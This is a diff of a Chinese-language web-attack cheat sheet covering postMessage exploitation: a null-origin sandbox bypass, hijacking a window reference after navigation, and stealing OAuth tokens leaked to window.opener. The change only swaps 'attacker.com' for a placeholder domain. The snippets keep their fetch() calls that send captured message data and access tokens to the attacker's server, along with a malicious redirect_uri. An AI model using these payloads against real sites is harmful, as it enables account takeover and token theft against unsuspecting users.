@@ -3,7 +3,7 @@
 ## Null Origin 沙箱绕过
 
 ```html
-<!-- null_origin_bypass.html — 托管在 attacker.com -->
+<!-- null_origin_bypass.html — 托管在 <attacker-domain> -->
 <!-- 目标页面: onmessage 检查 if (e.origin === window.origin) -->
 <iframe sandbox="allow-scripts allow-popups"
   srcdoc="
@@ -24,7 +24,7 @@
   // 接收响应
   window.addEventListener('message', function(e) {
     if (e.data && e.data.success) {
-      fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(e.data)));
+      fetch('https://<attacker-domain>/log?d=' + btoa(JSON.stringify(e.data)));
     }
   });
 </script>
@@ -80,7 +80,7 @@ var win = window.open('https://target.com/trusted_page.html');
 
 // 等待加载完成 → 导航到我们的页面（保留 reference）
 setTimeout(function() {
-    win.location = 'https://attacker.com/evil.html';
+    win.location = 'https://<attacker-domain>/evil.html';
 }, 3000);
 
 // 从 evil.html postMessage → e.source 仍然是原来 trusted 页面的 window
@@ -97,13 +97,13 @@ setTimeout(function() {
 <!-- 场景: OAuth proxy 页面在 opener.postMessage(token, '*') 中泄露 token -->
 <script>
 // Step 1: 诱导受害者打开 OAuth proxy
-// <a href="https://target.com/oauth/proxy?redirect_uri=https://attacker.com/callback">
+// <a href="https://target.com/oauth/proxy?redirect_uri=https://<attacker-domain>/callback">
 // Step 2: proxy 页面包含:
 //   window.opener.postMessage({access_token: 'xxx'}, '*');
 // Step 3: 我们的 callback 页面接收:
 window.addEventListener('message', function(e) {
     if (e.data.access_token) {
-        fetch('https://attacker.com/steal_token', {
+        fetch('https://<attacker-domain>/steal_token', {
             method: 'POST',
             body: JSON.stringify({token: e.data.access_token, origin: e.origin})
         });
